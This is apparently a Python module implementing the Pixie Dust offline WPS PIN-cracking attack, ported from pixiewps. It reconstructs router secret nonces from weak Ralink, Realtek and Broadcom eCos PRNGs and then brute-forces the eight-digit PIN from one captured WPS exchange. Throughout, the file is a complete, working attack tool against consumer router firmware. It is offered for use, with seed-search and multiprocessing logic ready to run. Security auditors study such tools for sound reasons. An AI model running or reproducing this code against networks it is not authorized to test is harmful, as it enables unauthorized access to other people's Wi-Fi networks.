"""Offline WPS PIN recovery (Pixie Dust / pixiewps algorithm).

A pure-Python implementation of the offline attack used by ``pixiewps``
(https://github.com/wiire-a/pixiewps, GPL-3.0) and integrated into reaver
(``reaver -K``): vulnerable AP firmware generates the WPS secret nonces
``E-S1``/``E-S2`` from weak, predictable PRNGs (Ralink LFSR, Realtek
glibc-style ``srand``/``rand``, Broadcom eCos LCGs).  Given one captured
WPS exchange (PKE, PKR, E-Hash1, E-Hash2, E-Nonce, AuthKey) the PIN is
recovered offline in two independent 10^4 / 10^4+10^3 HMAC-SHA256
searches.

Verification relation (per the WPS spec and the wpa_supplicant reference
implementation)::

    PSK1   = HMAC-SHA256(AuthKey, ASCII(pin[0:4]))[:16]
    PSK2   = HMAC-SHA256(AuthKey, ASCII(pin[4:8]))[:16]
    E-Hash1 = HMAC-SHA256(AuthKey, E-S1 || PSK1 || PKE || PKR)
    E-Hash2 = HMAC-SHA256(AuthKey, E-S2 || PSK2 || PKE || PKR)

The mode logic (auto order, special cases, RTL819x seed windows, eCos
scans) mirrors pixiewps' ``main()`` flow.
"""

from __future__ import annotations

import os
import struct
import time
from concurrent.futures import ProcessPoolExecutor
from dataclasses import dataclass, field
from typing import Callable, Optional

from . import crypto, prngs, wps
from .wps import Capture

__all__ = [
    "PixieResult",
    "PixieSolver",
    "MODE3_TRIES",
    "SEC_PER_DAY",
]

MODE3_TRIES = 60 * 10      # RTL819x ES1 seed distance window (pixiewps)
SEC_PER_DAY = 86400
_ZERO16 = b"\x00" * 16

ProgressCb = Optional[Callable[[str], None]]


@dataclass
class PixieResult:
    """Outcome of an offline pixie-dust solve."""

    found: bool
    pin: Optional[str] = None
    mode: Optional[str] = None
    es1: Optional[bytes] = None
    es2: Optional[bytes] = None
    psk1: Optional[bytes] = None
    psk2: Optional[bytes] = None
    seeds: dict = field(default_factory=dict)
    attempts: int = 0
    duration: float = 0.0
    messages: list = field(default_factory=list)

    def __str__(self) -> str:
        if self.found:
            pin = self.pin if self.pin else "<empty>"
            return (f"WPS PIN recovered: {pin}  (mode: {self.mode}, "
                    f"{self.duration:.1f}s)")
        return "WPS PIN not found (AP not vulnerable to pixie dust?)"


# ---------------------------------------------------------------------------
# Multiprocessing workers (module-level for pickling)
# ---------------------------------------------------------------------------

def _rtl_seed_chunk(args) -> Optional[int]:
    """Search a descending [start, end] chunk for the glibc seed."""
    enonce, start, end, target0 = args
    for seed in range(start, end - 1, -1):
        if prngs.glibc_fast_seed(seed) == target0:
            if prngs.glibc_fast_nonce(seed) == enonce:
                return seed
    return None


# ---------------------------------------------------------------------------
# Solver
# ---------------------------------------------------------------------------


class PixieSolver:
    """Offline WPS PIN solver for one captured exchange."""

    def __init__(self, capture: Capture, progress: ProgressCb = None):
        self.capture = capture
        self.progress = progress or (lambda m: None)
        problems = capture.validate()
        if problems:
            raise ValueError("invalid capture: " + "; ".join(problems))
        self._authkey = self._resolve_authkey()
        self._empty_psk = wps.empty_psk(self._authkey)
        self._pke = capture.pke
        self._pkr = capture.pkr
        # Precompute the PSK-half tables (independent of E-S1/E-S2):
        # 10,000 HMAC-SHA256 each, done once for the whole solve.
        self._psk1_table = [
            (f"{h1:04d}",
             crypto.hmac_sha256(self._authkey, f"{h1:04d}".encode())[:16])
            for h1 in range(10000)
        ]
        self._psk2_table = [
            (f"{h2:04d}",
             crypto.hmac_sha256(self._authkey, f"{h2:04d}".encode())[:16])
            for h2 in range(10000)
        ]
        self.attempts = 0

    # ------------------------------------------------------------------
    # AuthKey resolution
    # ------------------------------------------------------------------

    def _resolve_authkey(self) -> bytes:
        cap = self.capture
        if cap.authkey:
            return cap.authkey
        if cap.small_dh:
            # DHKey = SHA-256(PKE) (enrollee privkey == 1)
            dh_shared = cap.pke
        elif cap.pke == wps.WPS_RTL_PKE:
            # Realtek fixed private key: shared = PKR^priv mod p
            shared = wps.dh_shared_secret(cap.pkr,
                                          int.from_bytes(
                                              wps.WPS_RTL_PRIV_KEY, "big"))
            dh_shared = shared
        else:
            raise ValueError(
                "authkey is required (pass --authkey, or use --dh-small / "
                "the RTL819x fixed-key path)")
        if cap.rnonce is None or cap.bssid is None:
            raise ValueError(
                "deriving the authkey also requires --r-nonce and --bssid")
        sk = wps.derive_session_keys(dh_shared, cap.enonce, cap.bssid,
                                     cap.rnonce)
        return sk.authkey

    # ------------------------------------------------------------------
    # Core PIN cracking
    # ------------------------------------------------------------------

    def _outer_hmac(self, es: bytes, psk: bytes) -> bytes:
        return crypto.hmac_sha256(self._authkey,
                                  es + psk + self._pke + self._pkr)

    def _empty_psk_half(self, es: bytes, ehash: bytes) -> bool:
        self.attempts += 1
        return self._outer_hmac(es, self._empty_psk) == ehash

    def crack_first_half(self, es1: bytes) -> Optional[int | str]:
        """Find the first PIN half.

        Returns the 4-digit half as an ``int``, ``""`` for the empty-PIN
        special case, or ``None``.
        """
        if self._empty_psk_half(es1, self.capture.ehash1):
            return ""
        for _half, psk1 in self._psk1_table:
            self.attempts += 1
            if self._outer_hmac(es1, psk1) == self.capture.ehash1:
                return int(_half)
        return None

    def crack_second_half(self, first_half: int, es2: bytes) -> Optional[str]:
        """Find the second half given a valid first half.

        Mirrors pixiewps: first the 1,000 check-digit-valid candidates,
        then the remaining 9,000 (catches non-conformant APs and 4-digit
        PINs with trailing zeros).
        """
        for h2 in range(1000):
            check = wps.wps_pin_checksum(first_half * 1000 + h2)
            c2 = h2 * 10 + check
            _half, psk2 = self._psk2_table[c2]
            self.attempts += 1
            if self._outer_hmac(es2, psk2) == self.capture.ehash2:
                return f"{first_half:04d}{c2:04d}"
        for h2 in range(10000):
            if wps.wps_pin_valid(first_half * 10000 + h2):
                continue  # already covered above
            _half, psk2 = self._psk2_table[h2]
            self.attempts += 1
            if self._outer_hmac(es2, psk2) == self.capture.ehash2:
                return f"{first_half:04d}{h2:04d}"
        return None

    def crack(self, es1: bytes, es2: bytes) -> Optional[str]:
        """Full PIN crack for a candidate (E-S1, E-S2) pair."""
        h1 = self.crack_first_half(es1)
        if h1 is None:
            return None
        if h1 == "":
            if self._empty_psk_half(es2, self.capture.ehash2):
                return ""
            return None
        return self.crack_second_half(h1, es2)

    # ------------------------------------------------------------------
    # E-S1/E-S2 recovery per mode
    # ------------------------------------------------------------------

    def _try_pair(self, es1: bytes, es2: bytes, label: str) -> Optional[bytes]:
        self.progress(f"  trying E-S1/E-S2 pair ({label})")
        pin = self.crack(es1, es2)
        if pin is not None:
            self.progress(f"  [+] PIN found via {label}: {pin or '<empty>'}")
            return pin
        return None

    def _mode_rt(self) -> Optional[tuple[bytes, bytes, dict, str]]:
        """Ralink LFSR: rebuild state from the nonce, step backwards."""
        enonce = self.capture.enonce
        state = prngs.ralink_restore_state(enonce)
        # Verify the restored state regenerates the nonce (C flow).
        s = state
        for j in range(16):
            b, s = prngs.ralink_forward_byte(s)
            if b != enonce[j]:
                self.progress("  RT: nonce not from Ralink LFSR, skipping")
                return None
        s = state
        es2 = bytearray(16)
        for i in range(15, -1, -1):
            b, s = prngs.ralink_backward_byte(s)
            es2[i] = b
        s2_seed = s
        es1 = bytearray(16)
        for i in range(15, -1, -1):
            b, s = prngs.ralink_backward_byte(s)
            es1[i] = b
        s1_seed = s
        return (bytes(es1), bytes(es2),
                {"nonce_seed": state, "s1_seed": s1_seed,
                 "s2_seed": s2_seed}, "rt")

    def _mode_rtl819x(self, start: Optional[int] = None,
                      end: Optional[int] = None, full: bool = False,
                      jobs: int = 1) -> Optional[tuple[bytes, bytes, dict, str]]:
        """Realtek RTL819x: find the glibc srand seed, then ES1/ES2."""
        enonce = self.capture.enonce
        for idx in (0, 4, 8, 12):
            if enonce[idx] & 0x80:
                self.progress(
                    "  RTL819x: nonce high bits set - not glibc rand, skipping")
                return None

        now = int(time.time())
        if full:
            start, end = 0xFFFFFFFF, 0
        else:
            start = start if start is not None else now + SEC_PER_DAY
            end = end if end is not None else now - SEC_PER_DAY
        if start == end:
            raise ValueError("start and end must differ")
        if start < end:
            start, end = end, start  # C searches descending from start

        span = start - end
        self.progress(f"  RTL819x: searching seeds {start}..{end} "
                      f"({span} candidates, {jobs} worker(s))")
        t0 = time.time()
        seed = self._find_rtl_seed(enonce, start, end, jobs)
        dt = time.time() - t0
        if seed is None:
            self.progress(f"  RTL819x: no glibc seed in range ({dt:.1f}s) - "
                          "AP may still be vulnerable; widen the range "
                          "or use --full")
            return None
        self.progress(f"  RTL819x: nonce seed {seed} found in {dt:.1f}s")

        # E-S1 candidates: nonce_seed +/- dist (C: +dist then -dist)
        for dist in range(MODE3_TRIES + 1):
            for s1 in ((seed + dist) & 0xFFFFFFFF, (seed - dist) & 0xFFFFFFFF):
                es1 = prngs.rtl_nonce_fill(s1)
                pin = self.crack_first_half(es1)
                if pin in (None, ""):
                    continue
                # E-S2: s1_seed + j for j in 0..10 (C: forward window)
                found = None
                for j in range(10):
                    es2 = prngs.rtl_nonce_fill((s1 + j) & 0xFFFFFFFF)
                    fullpin = self.crack_second_half(pin, es2)
                    if fullpin is not None:
                        found = (es1, es2, fullpin, s1, (s1 + j) & 0xFFFFFFFF)
                        break
                if found:
                    es1b, es2b, fullpin, s1s, s2s = found
                    self.progress(
                        f"  [+] PIN found (dist={dist}, es1_seed={s1s}, "
                        f"es2_seed={s2s}): {fullpin}")
                    return (es1b, es2b,
                            {"nonce_seed": seed, "s1_seed": s1s,
                             "s2_seed": s2s}, "rtl819x")
        return None

    def _find_rtl_seed(self, enonce: bytes, start: int, end: int,
                       jobs: int) -> Optional[int]:
        """Search descending [end..start] for the glibc seed (multi-proc)."""
        target0 = int.from_bytes(enonce[0:4], "big")
        if jobs <= 1:
            return _rtl_seed_chunk((enonce, start, end, target0))
        span = start - end
        chunk = max(1, (span + jobs - 1) // jobs)
        # descending chunks: [start, start-chunk+1), [start-chunk, ...), ...
        from concurrent.futures import as_completed
        with ProcessPoolExecutor(max_workers=jobs) as ex:
            futures = []
            cur = start
            while cur > end:
                lo = max(cur - chunk + 1, end)
                futures.append(
                    ex.submit(_rtl_seed_chunk, (enonce, cur, lo, target0)))
                cur = lo - 1
            result: Optional[int] = None
            for fut in as_completed(futures):
                found = fut.result()
                if found is not None:
                    result = found
                    break
            for f in futures:
                f.cancel()
        return result

    def _mode_ecos_simple(self) -> Optional[tuple[bytes, bytes, dict, str]]:
        """Broadcom eCos 'simple' LCG: 25-bit seed scan."""
        enonce = self.capture.enonce
        # C: `uint32_t known = wps->e_nonce[0] << 25;` — the 32-bit shift
        # silently drops the byte's top bit, i.e. only the top 7 seed bits
        # are kept; replicate that in Python (no implicit wrap).
        known = (enonce[0] & 0x7F) << 25
        self.progress("  ECOS_SIMPLE: scanning 2^25 seed space ...")
        t0 = time.time()
        for counter in range(0x02000000):
            seed = known | counter
            s = seed
            ok = True
            for i in range(1, 16):
                v, s = prngs.ecos_rand_simple(s)
                if (v & 0xFF) != enonce[i]:
                    ok = False
                    break
            if ok:
                dt = time.time() - t0
                self.progress(f"  ECOS_SIMPLE: seed {seed} found ({dt:.1f}s)")
                s1_seed = s
                es1 = bytearray(16)
                for i in range(16):
                    v, s = prngs.ecos_rand_simple(s)
                    es1[i] = v & 0xFF
                s2_seed = s
                es2 = bytearray(16)
                for i in range(16):
                    v, s = prngs.ecos_rand_simple(s)
                    es2[i] = v & 0xFF
                return (bytes(es1), bytes(es2),
                        {"nonce_seed": seed, "s1_seed": s1_seed,
                         "s2_seed": s2_seed}, "ecos-simple")
        self.progress("  ECOS_SIMPLE: no seed matched")
        return None

    def _mode_ecos_full(self, mode: int, limit: Optional[int] = None
                        ) -> Optional[tuple[bytes, bytes, dict, str]]:
        """Full (capped) seed scans for ECOS_SIMPLEST / ECOS_KNUTH."""
        enonce = self.capture.enonce
        if limit is None:
            limit = 0x01000000
            self.progress(
                f"  {prngs.MODE_NAMES[mode]}: scanning first {limit} seeds "
                "(use --ecos-limit to scan more; the C pixiewps tool can "
                "scan all 2^32)")
        else:
            self.progress(
                f"  {prngs.MODE_NAMES[mode]}: scanning {limit} seeds ...")
        t0 = time.time()
        if mode == prngs.ECOS_SIMPLEST:
            for index in range(limit):
                s = index
                ok = True
                for i in range(16):
                    v, s = prngs.ecos_rand_simplest(s)
                    if (v & 0xFF) != enonce[i]:
                        ok = False
                        break
                if ok:
                    dt = time.time() - t0
                    es1 = bytearray(16)
                    for i in range(16):
                        v, s = prngs.ecos_rand_simplest(s)
                        es1[i] = v & 0xFF
                    s2_seed = s
                    es2 = bytearray(16)
                    for i in range(16):
                        v, s = prngs.ecos_rand_simplest(s)
                        es2[i] = v & 0xFF
                    return (bytes(es1), bytes(es2),
                            {"nonce_seed": index, "s1_seed": s2_seed,
                             "s2_seed": s}, "ecos-simplest")
        else:  # ECOS_KNUTH
            for index in range(limit):
                s = index
                ok = True
                for i in range(16):
                    s = prngs.ecos_rand_knuth(s)
                    if (s & 0xFF) != enonce[i]:
                        ok = False
                        break
                if ok:
                    dt = time.time() - t0
                    es1 = bytearray(16)
                    for i in range(16):
                        s = prngs.ecos_rand_knuth(s)
                        es1[i] = s & 0xFF
                    s2_seed = s
                    es2 = bytearray(16)
                    for i in range(16):
                        s = prngs.ecos_rand_knuth(s)
                        es2[i] = s & 0xFF
                    return (bytes(es1), bytes(es2),
                            {"nonce_seed": index, "s1_seed": s2_seed,
                             "s2_seed": s}, "ecos-knuth")
        self.progress(f"  {prngs.MODE_NAMES[mode]}: no seed matched in range")
        return None

    # ------------------------------------------------------------------
    # Auto mode (pixiewps main-loop order)
    # ------------------------------------------------------------------

    def auto(self, modes: Optional[list[int]] = None,
             rtl_start: Optional[int] = None, rtl_end: Optional[int] = None,
             rtl_full: bool = False, ec_limit: Optional[int] = None,
             jobs: int = 1) -> PixieResult:
        """Run the full auto-detection flow; returns a PixieResult."""
        cap = self.capture
        t0 = time.time()
        result = PixieResult(found=False, duration=0.0)

        def finish(pin: Optional[str], mode: str, es1, es2,
                   seeds: dict) -> PixieResult:
            result.found = True
            result.pin = pin
            result.mode = mode
            result.es1 = es1
            result.es2 = es2
            result.seeds = seeds
            result.duration = time.time() - t0
            result.attempts = self.attempts
            if pin:
                psk1, psk2 = wps.derive_psk(self._authkey, pin)
                result.psk1, result.psk2 = psk1, psk2
            elif pin == "":
                result.psk1 = result.psk2 = self._empty_psk
            result.messages = [f"pin={pin or '<empty>'} mode={mode}"]
            return result

        is_rtl_pke = (cap.pke == wps.WPS_RTL_PKE)
        mode_auto = modes is None
        if mode_auto:
            # Special cases first (C flow):
            #  E-S1 = E-S2 = 0       only when PKE != RTL fixed key
            #  E-S1 = E-S2 = E-Nonce always
            if not is_rtl_pke:
                self.progress("  special case: E-S1 = E-S2 = 0")
                pin = self._try_pair(_ZERO16, _ZERO16, "zero-nonces")
                if pin is not None:
                    return finish(pin, "zero", _ZERO16, _ZERO16, {})
            self.progress("  special case: E-S1 = E-S2 = E-Nonce")
            pin = self._try_pair(cap.enonce, cap.enonce, "nonce-clone")
            if pin is not None:
                return finish(pin, "nonce-clone", cap.enonce, cap.enonce,
                              {})
            modes = [prngs.RTL819x] if is_rtl_pke else (
                [prngs.RT]
                + ([prngs.RTL819x]
                   if all(not cap.enonce[i] & 0x80 for i in (0, 4, 8, 12))
                   else [])
                + [prngs.ECOS_SIMPLE]
            )
        self.progress(f"  modes: " + ", ".join(
            prngs.MODE_NAMES[m] for m in modes))

        for m in modes:
            if m == prngs.RT:
                if not mode_auto:
                    self.progress("  RT: forced zero E-S1/E-S2")
                    if self._try_pair(_ZERO16, _ZERO16, "zero-nonces"):
                        return finish("", "zero", _ZERO16, _ZERO16, {})
                self.progress(f"  mode: {prngs.MODE_NAMES[m]}")
                out = self._mode_rt()
            elif m == prngs.RTL819x:
                if not mode_auto:
                    self.progress("  RTL819x: forced E-S1 = E-S2 = E-Nonce")
                    pin = self._try_pair(cap.enonce, cap.enonce, "nonce-clone")
                    if pin is not None:
                        return finish(pin, "rtl819x-clone", cap.enonce,
                                      cap.enonce, {})
                self.progress(f"  mode: {prngs.MODE_NAMES[m]}")
                out = self._mode_rtl819x(rtl_start, rtl_end, rtl_full, jobs)
            elif m == prngs.ECOS_SIMPLE:
                self.progress(f"  mode: {prngs.MODE_NAMES[m]}")
                out = self._mode_ecos_simple()
            elif m in (prngs.ECOS_SIMPLEST, prngs.ECOS_KNUTH):
                self.progress(f"  mode: {prngs.MODE_NAMES[m]}")
                out = self._mode_ecos_full(m, ec_limit)
            else:
                continue
            if out is not None:
                es1, es2, seeds, mode = out
                pin = self.crack(es1, es2)
                if pin is not None:
                    return finish(pin, mode, es1, es2, seeds)
                self.progress(f"  {mode}: nonces matched but PIN search "
                              "failed (nonce_match only)")

        result.duration = time.time() - t0
        result.attempts = self.attempts
        result.messages = ["not found"]
        return result
